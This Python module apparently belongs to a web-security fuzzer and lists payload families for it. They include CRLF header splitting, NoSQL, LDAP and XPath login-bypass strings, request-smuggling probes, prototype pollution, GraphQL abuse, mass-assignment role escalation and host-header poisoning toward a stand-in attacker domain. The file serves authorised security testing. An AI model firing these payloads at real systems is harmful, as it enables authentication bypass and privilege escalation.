"""DEEPHUNT Wave 1 (Worker 3) — genuinely NEW payload pattern families.

These families do NOT duplicate the existing corpus classes in
deephunt/payloads.py (xss, sqli, cmdi, traversal, xxe, openredirect, jwt,
ssrf, ssti, authz-403, hpp). Each entry is a *pattern shape* — a family of
mutations the fuzzer instantiates — with a comment on when it fires.

All shapes are original summaries of public methodology (HackTricks,
OWASP WSTG/API Top 10, PortSwigger Academy). Never blind-fire: consumed by
the enforced test loop with hypothesis gate and rate limits.
"""

PAYLOAD_FAMILIES = {
    # Fires when: user input lands in a response header, redirect target, or
    # log line, and naive filters strip only literal \r\n or single-decoded
    # %0D%0A. The Unicode sequences are normalized to real CRLF by some
    # stacks *after* the filter runs.
    "crlf": [
        "%0d%0aSet-Cookie: dh_marker=1",          # classic: response splitting
        "%0D%0AHeader-Test: dh_marker",            # case variant
        "%E5%98%8A%E5%98%8DSet-Cookie: dh_marker=1",  # U+560A/U+560D -> LF/CR after normalization
        "%E5%98%8A",                               # lone LF homoglyph
        "%E5%98%8D",                               # lone CR homoglyph
        "%250d%250aSet-Cookie: dh_marker=1",      # double-encoded, filter decodes once
        "%0d%0a%20Set-Cookie: dh_marker=1",       # space-prefixed variant
        "%0d%0aContent-Type: text/html%0d%0a%0d%0a<dh>",
    ],

    # Fires when: JSON request body fields are passed unmodified into a
    # MongoDB-style query document (login, search, filter endpoints).
    "nosql": [
        '{"$ne": ""}',        # password != "" -> always true
        '{"$gt": ""}',        # greater-than empty string matches everything
        '{"$regex": ".*"}',   # regex match-all
        '{"$in": [""]}',      # membership probe
        '{"$where": "1==1"}', # JS expression (Mongo $where) - lab only
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',  # full-object login bypass
    ],

    # Fires when: credentials/search input is string-concatenated into an
    # LDAP filter, e.g. (&(uid=$u)(userPassword=$p)). Metachars *, (, ), \
    # restructure the boolean logic.
    "ldap": [
        "*)(uid=*))(|(uid=*",      # classic auth bypass: OR + wildcard
        "*)(&(objectClass=*",       # filter-shape probe
        "admin*",                   # wildcard enumeration
        "*)(mail=*@*)",             # dump entries with mail
        "\\2a",                     # escaped asterisk probe (tests escaping)
    ],

    # Fires when: user input is interpolated into an XPath expression over
    # an XML datastore, e.g. //user[username='$u' and password='$p'].
    "xpath": [
        "admin' or '1'='1",         # quote-break auth bypass
        "' or '1'='1' --",          # comment-tail variant
        "\" or \"1\"=\"1",          # double-quote variant
        "'] | //user/* | //*['",    # union-style node dump probe
        "admin' and '1'='2",         # boolean-false control for blind diff
    ],

    # Fires when: an HTTP/1.1 front-end/back-end pair disagrees on request
    # framing. Timing-only detection shapes; never poison shared state.
    # Each shape is a (headers, body) template for the timing probes.
    "smuggling": [
        # CL.TE timing probe: front honors CL(4), back honors TE -> back waits
        "CL.TE|Content-Length: 4 + Transfer-Encoding: chunked|body: '1\\r\\nA\\r\\n0\\r\\n\\r\\n'",
        # TE.CL timing probe: front honors TE, back waits for CL(6) bytes
        "TE.CL|Content-Length: 6 + Transfer-Encoding: chunked|body: '0\\r\\n\\r\\nX'",
        # TE obfuscation ladder (one variant per probe)
        "TE-OBF|Transfer-Encoding: xchunked",
        "TE-OBF|Transfer-Encoding : chunked",   # space before colon
        "TE-OBF|Transfer-Encoding:\\tchunked",  # tab after colon
        "TE-OBF| Transfer-Encoding: chunked",   # leading space
        "TE-OBF|X: x\\nTransfer-Encoding: chunked",  # folded header
        # CL.0: back-end ignores body; smuggled request line in body
        "CL.0|Content-Length: <len>|body: 'GET /dh-unique-path HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n'",
        # Hop-by-hop stripping: proxy deletes the named framing header
        "HOPBYHOP|Connection: Content-Length",
        "HOPBYHOP|Connection: Transfer-Encoding",
    ],

    # Fires when: a Node.js backend deep-merges attacker JSON into shared
    # objects. Alternate key paths defeat literal __proto__ blocklists.
    "prototype_pollution": [
        '{"__proto__": {"dh_marker": "1"}}',
        '{"constructor": {"prototype": {"dh_marker": "1"}}}',
        '{"__proto__": {"json spaces": 10}}',   # non-destructive oracle: pretty-prints JSON
        "?__proto__[dh_marker]=1",              # query-string vector
        "?constructor[prototype][dh_marker]=1", # query-string bypass vector
        "?__pro__proto__to__[dh_marker]=1",     # single-strip evasion
        '{"__proto__\\u0000": {"dh_marker": "1"}}',  # null-byte key variant
    ],

    # Fires when: a GraphQL endpoint exposes filter args, batching, or weak
    # complexity analysis. Typed schema != sanitized input.
    "graphql": [
        '{__schema{types{name}}}',                       # introspection baseline
        'query { __type(name: "User") { fields { name } } }',  # __schema-disabled fallback
        '{ users(filter: "admin\'--") { id } }',         # SQLi inside filter arg
        '{ users(filter: "{$gt: \\"\\"}") { id } }',    # NoSQL inside filter arg
        '[{query:"{a}"},{query:"{b}"}]',                # JSON array batching shape
        '{ a1: login(u:"x",p:"1"){ok} a2: login(u:"x",p:"2"){ok} }',  # alias batching
        '{ user(id:1){ friends{ friends{ friends{ name }}}}}',  # nesting depth probe
    ],

    # Fires when: a JSON API auto-binds request keys to a model without an
    # explicit field allowlist (OWASP API3:2023). Test on own account only.
    "mass_assignment": [
        '{"role": "admin"}',
        '{"isAdmin": true}',
        '{"verified": true}',
        '{"balance": 99999}',
        '{"user": {"role": "admin"}}',      # nested shape
        '{"role_ids": [1]}',                 # array shape
        '{"Role": "admin"}',                 # case variant
    ],

    # Fires when: an opaque blob (cookie/hidden field/API body) is
    # server-side deserialized. Magic bytes select the gadget playbook;
    # these are *detection* markers, not exploit chains.
    "deserialization_markers": [
        "rO0AB",          # Java serialization magic (base64)
        "O:",             # PHP serialize() object marker
        "\\x80\\x04",     # Python pickle protocol 4
        "!!python/",      # YAML python object tag
        "AAEAAAD",        # .NET BinaryFormatter-ish base64 head
    ],

    # Fires when: absolute URLs in emails/links are built from request
    # headers (password reset, invites). One header variant per probe.
    "host_header": [
        "Host: dh-attacker.example",
        "X-Forwarded-Host: dh-attacker.example",
        "X-Host: dh-attacker.example",
        "Forwarded: host=dh-attacker.example",
        "X-Original-URL: /admin",       # route-override 403 bypass
        "X-Rewrite-URL: /admin",         # route-override 403 bypass
        "X-Forwarded-Path: /admin",      # route-override 403 bypass
    ],

    # Fires when: uploaded XML/SVG is server-side XSLT-transformed.
    # Benign capability probes only on live targets.
    "xslt": [
        '<?xml-stylesheet type="text/xsl" href="data:text/xml,<xsl:stylesheet/>"?>',
        '<xsl:value-of select="system-property(\'xsl:version\')"/>',  # version oracle
        '<svg><style>@import "data:text/xml,<xsl:stylesheet/>"</style></svg>',
    ],
}
